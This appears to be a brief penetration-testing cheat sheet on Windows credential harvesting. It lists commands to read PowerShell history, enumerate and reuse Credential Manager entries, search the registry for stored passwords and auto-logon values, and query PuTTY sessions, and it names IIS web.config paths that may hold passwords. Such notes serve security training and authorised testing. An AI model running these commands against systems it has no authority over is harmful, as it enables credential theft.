# Credentials Harvesting

#### Powershell History

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`&#x20;

#### Saved Windows Credentials

`cmdkey /list` lists all credentials stored in the Windows Credential Manager (Note: won't allow you to view them directly)

`runas /savecred /user:admin cmd.exe` run a cmd.exe as the user stored in the Credential Manager

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v keyword` to view if auto-log on is stored in the Windows registry

`reg query HKLM /f "password" /t REG_SZ /s` to search the registry for anything related to the password

#### Internet Information Services (IIS) Configuration

Is responsible for the default web server on Windows installs. Will sometimes store password for databases or configurated authentications.

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

#### Retrieve Credentials from software

PuTTY (SSH client on windows): stores connection parameters such as IPs and SSH passwords. Only accessible with Proxy  `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
